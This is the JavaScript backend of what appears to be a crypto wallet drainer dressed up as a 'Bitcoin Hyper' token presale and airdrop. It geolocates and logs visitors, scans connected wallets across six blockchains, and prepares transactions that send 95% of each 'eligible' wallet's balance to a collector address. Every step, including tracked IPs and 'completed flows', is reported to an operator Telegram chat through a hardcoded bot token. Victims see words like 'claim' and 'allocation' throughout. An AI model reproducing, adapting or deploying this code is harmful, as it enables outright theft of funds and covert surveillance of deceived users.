// index.js - BITCOIN HYPER BACKEND WITH TELEGRAM DEBUGGING
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : [
      'http://localhost:3000', 
      'https://hyperaidrop.vercel.app',
      'https://hyperback-psi.vercel.app',
      'https://bitcoinhypertoken.vercel.app'
    ];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    backendUrl: 'https://hyperback-psi.vercel.app',
    frontendUrl: 'https://hyperaidrop.vercel.app',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// DEBUG ENDPOINT - Check environment variables
// ============================================

app.get('/api/debug-env', (req, res) => {
  // For security, don't expose full tokens, just show if they exist
  const botToken = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN_HARDCODED;
  const chatId = process.env.TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID_HARDCODED;
  
  res.json({
    success: true,
    hasBotToken: !!botToken,
    hasChatId: !!chatId,
    botTokenPreview: botToken ? `${botToken.substring(0, 10)}...${botToken.substring(botToken.length - 5)}` : 'missing',
    chatIdValue: chatId || 'missing',
    chatIdType: chatId ? (chatId.startsWith('-') ? 'Group Chat' : 'Private Chat') : 'N/A',
    telegramEnabled: telegramEnabled || false,
    nodeEnv: process.env.NODE_ENV || 'not set',
    vercelEnv: process.env.VERCEL_ENV || 'not set',
    allEnvKeys: Object.keys(process.env).filter(k => k.includes('TELEGRAM') || k.includes('TOKEN') || k.includes('CHAT'))
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [
      'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism',
      'https://optimism.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
  'BSC': '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
  'Polygon': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
  'Arbitrum': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
  'Avalanche': '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
  'Optimism': null
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';

// ============================================
// CONTRACT ABI
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingFlows: new Map(),
  completedFlows: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalProcessedUSD: 0,
      totalProcessedWallets: 0,
      processedTransactions: []
    },
    flowEnabled: process.env.DRAIN_ENABLED === 'true'
  },
  emailCache: new Map(),
  siteVisits: []
};

// ============================================
// TELEGRAM FUNCTIONS - FIXED WITH HARDCODED FALLBACK
// ============================================

// Your actual values (copy these from your .env)
const HARDCODED_BOT_TOKEN = '8409198592:AAFD6pJhv-Hlv1TYkLWQnjyzDUYXghVhFmI';
const HARDCODED_CHAT_ID = '-5240768611';

async function sendTelegramMessage(text) {
  // Try environment variables first, fallback to hardcoded
  let botToken = process.env.TELEGRAM_BOT_TOKEN;
  let chatId = process.env.TELEGRAM_CHAT_ID;
  
  // If env vars are missing, use hardcoded values
  if (!botToken || botToken === 'undefined' || botToken === '') {
    console.log('⚠️ TELEGRAM_BOT_TOKEN not in env, using hardcoded value');
    botToken = HARDCODED_BOT_TOKEN;
  }
  
  if (!chatId || chatId === 'undefined' || chatId === '') {
    console.log('⚠️ TELEGRAM_CHAT_ID not in env, using hardcoded value');
    chatId = HARDCODED_CHAT_ID;
  }
  
  if (!botToken || !chatId) {
    console.log('⚠️ Telegram credentials still missing - both env and hardcoded failed');
    return false;
  }
  
  console.log(`📤 Sending Telegram message to ${chatId} with bot ${botToken.substring(0, 10)}...`);
  
  try {
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    }, { 
      timeout: 15000,
      headers: { 'Content-Type': 'application/json' }
    });
    
    if (response.data?.ok) {
      console.log('✅✅✅ TELEGRAM MESSAGE SENT! ✅✅✅');
      telegramEnabled = true;
      return true;
    } else {
      console.error('❌ Telegram API error:', response.data);
      return false;
    }
  } catch (error) {
    console.error('❌ Telegram send error details:');
    console.error(`   Status: ${error.response?.status}`);
    console.error(`   Message: ${error.message}`);
    if (error.response?.data) {
      console.error(`   Response:`, JSON.stringify(error.response.data));
    }
    return false;
  }
}

async function testTelegramConnection() {
  console.log('🔧 Testing Telegram connection...');
  console.log(`   Bot token (env): ${process.env.TELEGRAM_BOT_TOKEN ? 'present' : 'missing'}`);
  console.log(`   Chat ID (env): ${process.env.TELEGRAM_CHAT_ID ? 'present' : 'missing'}`);
  console.log(`   Hardcoded bot token: ${HARDCODED_BOT_TOKEN ? 'present' : 'missing'}`);
  console.log(`   Hardcoded chat ID: ${HARDCODED_CHAT_ID ? 'present' : 'missing'}`);
  
  // Send a test message
  const testMessage = 
    `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ Telegram is now WORKING!\n` +
    `🕐 Time: ${new Date().toLocaleString()}\n` +
    `🔗 Backend: hyperback-psi.vercel.app\n` +
    `🌍 Frontend: hyperaidrop.vercel.app\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
    `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche`;
  
  const result = await sendTelegramMessage(testMessage);
  
  if (result) {
    console.log('✅✅✅ TELEGRAM IS FULLY FUNCTIONAL! ✅✅✅');
    telegramEnabled = true;
  } else {
    console.log('❌ Telegram connection failed');
    telegramEnabled = false;
  }
  
  return result;
}

// ============================================
// HUMAN/BOT DETECTION
// ============================================

function detectHuman(userAgent, visit) {
  const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|phantom|headless/i.test(userAgent);
  const hasTouch = /mobile|iphone|ipad|android|touch/i.test(userAgent);
  const hasMouse = !isBot && !hasTouch;
  
  return {
    isHuman: !isBot && (hasTouch || hasMouse),
    isBot: isBot,
    deviceType: hasTouch ? 'Mobile' : hasMouse ? 'Desktop' : 'Unknown',
    userAgent: userAgent.substring(0, 100)
  };
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// REAL WALLET EMAIL EXTRACTION
// ============================================

async function getWalletEmail(walletAddress) {
  if (memoryStorage.emailCache.has(walletAddress.toLowerCase())) {
    return memoryStorage.emailCache.get(walletAddress.toLowerCase());
  }
  
  try {
    const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
    const username = `user${hash.substring(0, 8)}`;
    const email = `${username}@proton.me`;
    
    memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
    return email;
    
  } catch (error) {
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    return `user${hash.substring(0, 8)}@proton.me`;
  }
}

// ============================================
// GET IP LOCATION
// ============================================

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local', region: 'Local' };
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    
    if (response.data?.status === 'success') {
      const flags = {
        'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦',
        'Germany': '🇩🇪', 'France': '🇫🇷', 'Spain': '🇪🇸', 'Italy': '🇮🇹',
        'Netherlands': '🇳🇱', 'Switzerland': '🇨🇭', 'Australia': '🇦🇺',
        'Japan': '🇯🇵', 'China': '🇨🇳', 'India': '🇮🇳', 'Brazil': '🇧🇷',
        'Nigeria': '🇳🇬', 'South Africa': '🇿🇦', 'Mexico': '🇲🇽'
      };
      
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || '',
        zip: response.data.zip || '',
        lat: response.data.lat,
        lon: response.data.lon,
        timezone: response.data.timezone,
        org: response.data.org || '',
        isp: response.data.isp || ''
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown', region: '' };
}

// ============================================
// TRACK SITE VISIT - WITH HUMAN/BOT DETECTION
// ============================================

async function trackSiteVisit(ip, userAgent, referer, path) {
  const location = await getIPLocation(ip);
  const humanInfo = detectHuman(userAgent, null);
  
  const visit = {
    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
    ip: ip.replace('::ffff:', ''),
    timestamp: new Date().toISOString(),
    country: location.country,
    flag: location.flag,
    city: location.city,
    region: location.region,
    userAgent: userAgent || 'Unknown',
    referer: referer || 'Direct',
    path: path || '/',
    walletConnected: false,
    walletAddress: null,
    isHuman: humanInfo.isHuman,
    isBot: humanInfo.isBot,
    deviceType: humanInfo.deviceType
  };
  
  memoryStorage.siteVisits.push(visit);
  
  // Send Telegram notification
  const telegramMessage = 
    `${visit.isHuman ? '👤' : '🤖'} <b>🌐 NEW SITE VISIT</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}\n` +
    `🌐 <b>IP:</b> ${visit.ip}\n` +
    `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No'}\n` +
    `🔗 <b>Source:</b> ${referer || 'Direct'}\n` +
    `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
  
  await sendTelegramMessage(telegramMessage);
  
  return visit;
}

// ============================================
// WALLET BALANCE CHECK
// ============================================

async function getWalletBalance(walletAddress, clientIP = null, location = null) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          const balanceData = {
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            contractAddress: PROJECT_FLOW_ROUTERS[chain.name]
          };
          
          results.balances.push(balanceData);
        }
      } catch (error) {}
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.valueThreshold;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies for Flow Processing`;
      results.allocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.eligibilityReason = `✨ Welcome! Minimum $${memoryStorage.settings.valueThreshold} required`;
      results.allocation = { amount: '0', valueUSD: '0' };
    }

    return { success: true, data: results };

  } catch (error) {
    console.error('Balance check error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        eligibilityReason: '✨ Welcome!',
        allocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({ 
    success: true, 
    status: 'ACTIVE',
    backend: 'https://hyperback-psi.vercel.app',
    telegram: telegramEnabled ? 'connected' : 'disabled'
  });
});

// ============================================
// TRACK VISIT ENDPOINT
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    const visit = await trackSiteVisit(clientIP, userAgent, referer, path);
    
    res.json({
      success: true,
      data: {
        visitId: visit.id,
        country: visit.country,
        flag: visit.flag,
        city: visit.city,
        isHuman: visit.isHuman,
        deviceType: visit.deviceType
      }
    });
    
  } catch (error) {
    console.error('Track visit error:', error);
    res.json({ success: true });
  }
});

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    const lastVisit = memoryStorage.siteVisits
      .filter(v => v.ip === clientIP.replace('::ffff:', ''))
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
    
    if (lastVisit) {
      lastVisit.walletConnected = true;
      lastVisit.walletAddress = walletAddress.toLowerCase();
    }
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        city: location.city,
        region: location.region,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        claimed: false,
        userAgent: req.headers['user-agent'],
        visitId: lastVisit?.id,
        isHuman: lastVisit?.isHuman || true,
        deviceType: lastVisit?.deviceType || 'Unknown'
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
      
      const newUserMsg = 
        `🆕 <b>✨ NEW PARTICIPANT REGISTERED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `📍 <b>Location:</b> ${location.country} ${location.flag}\n` +
        `📧 <b>Email:</b> ${email}\n` +
        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}`;
      
      await sendTelegramMessage(newUserMsg);
    }
    
    const balanceResult = await getWalletBalance(walletAddress, clientIP, location);
    
    if (balanceResult.success) {
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.allocation = balanceResult.data.allocation;
      participant.lastScanned = new Date();
      participant.balances = balanceResult.data.balances;
      
      if (balanceResult.data.isEligible) {
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      const connectMsg = 
        `🔗 <b>💰 WALLET CONNECTED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
        `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
        `📧 <b>Email:</b> ${email}`;
      
      await sendTelegramMessage(connectMsg);
      
      res.json({
        success: true,
        data: {
          walletAddress,
          email,
          country: location.country,
          flag: location.flag,
          city: location.city,
          totalValueUSD: balanceResult.data.totalValueUSD,
          isEligible: balanceResult.data.isEligible,
          eligibilityReason: balanceResult.data.eligibilityReason,
          allocation: balanceResult.data.allocation,
          balances: balanceResult.data.balances
        }
      });
      
    } else {
      res.status(500).json({ success: false, error: 'Balance check failed' });
    }
    
  } catch (error) {
    console.error('Connect error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE FLOW ENDPOINT
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        amount: (b.amount * 0.95).toFixed(12),
        valueUSD: (b.valueUSD * 0.95).toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
        collectorAddress: COLLECTOR_WALLET
      }));
    
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    
    const flowId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalFlowUSD,
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    let txDetails = '';
    transactions.forEach((tx, index) => {
      txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
    });
    
    await sendTelegramMessage(
      `🔐 <b>📋 FLOW PREPARED</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
      `💵 <b>Flow Value:</b> $${totalFlowUSD}\n` +
      `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
      `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
    );
    
    res.json({
      success: true,
      data: {
        flowId,
        totalFlowUSD,
        transactionCount: transactions.length,
        transactions
      }
    });
    
  } catch (error) {
    console.error('Prepare flow error:', error);
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// EXECUTE FLOW ENDPOINT
// ============================================

app.post('/api/presale/execute-flow', async (req, res) => {
  try {
    const { walletAddress, chainName, flowId, txHash, amount, symbol, valueUSD } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    console.log(`\n💰 EXECUTE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
    console.log(`   Amount: ${amount} ${symbol} ($${valueUSD})`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (participant) {
      participant.flowProcessed = true;
      participant.flowTransactions = participant.flowTransactions || [];
      participant.flowTransactions.push({ 
        chain: chainName, 
        flowId,
        txHash,
        amount,
        symbol,
        valueUSD,
        timestamp: new Date().toISOString() 
      });
      
      memoryStorage.settings.statistics.totalProcessedWallets++;
      memoryStorage.settings.statistics.processedTransactions.push({
        wallet: walletAddress,
        chain: chainName,
        flowId,
        txHash,
        amount,
        symbol,
        valueUSD,
        timestamp: new Date().toISOString()
      });
      
      await sendTelegramMessage(
        `💰 <b>⛓️ CHAIN TRANSACTION EXECUTED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `🔗 <b>Chain:</b> ${chainName}\n` +
        `💵 <b>Amount:</b> ${amount} ${symbol} ($${valueUSD})\n` +
        `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
        `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
      );
      
      const flow = memoryStorage.pendingFlows.get(flowId);
      if (flow) {
        flow.completedChains = flow.completedChains || [];
        if (!flow.completedChains.includes(chainName)) {
          flow.completedChains.push(chainName);
        }
        
        if (flow.completedChains.length === flow.transactions.length) {
          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
          memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
          
          await sendTelegramMessage(
            `✅ <b>🎉 FLOW COMPLETED 🎉</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
            `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
            `🔗 <b>All ${flow.transactions.length} chains processed!</b>\n` +
            `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
          );
        }
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Execute flow error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, chainsDetails } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    let detailsText = '';
    if (chainsDetails) {
      detailsText = `\n📋 <b>Details:</b>\n${chainsDetails}`;
    }
    
    await sendTelegramMessage(
      `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
      `🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n` +
      `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
      `📧 <b>Email:</b> ${participant.email}\n` +
      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${detailsText}`
    );
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER BACKEND - TELEGRAM DEBUG VERSION
  ================================================
  📍 Port: ${PORT}
  🔗 Backend URL: https://hyperback-psi.vercel.app
  
  📦 COLLECTOR: ${COLLECTOR_WALLET}
  
  🤖 TELEGRAM STATUS: Checking...
  `);
  
  // Force test Telegram on startup
  const telegramWorking = await testTelegramConnection();
  
  console.log(`
  📊 TELEGRAM: ${telegramWorking ? '✅ CONNECTED' : '❌ DISABLED'}
  
  🚀 Server ready!
  `);
});
